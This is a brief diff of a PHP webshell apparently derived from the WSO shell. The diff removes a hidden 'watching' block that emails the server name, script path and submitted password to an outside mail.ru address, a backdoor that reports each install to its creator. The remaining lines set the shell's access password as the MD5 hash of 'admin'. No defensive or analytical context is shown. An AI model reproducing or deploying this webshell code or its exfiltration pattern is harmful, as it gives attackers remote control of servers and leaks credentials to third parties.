@@ -1,8 +1,5 @@
 <?php
 //--------------Watching webshell!--------------
-if(array_key_exists('watching',$_POST)){
-	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'wso', $tmp); // Edit or delete!
-}
 //-----------------Password---------------------
 $_password = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $_agent = true;
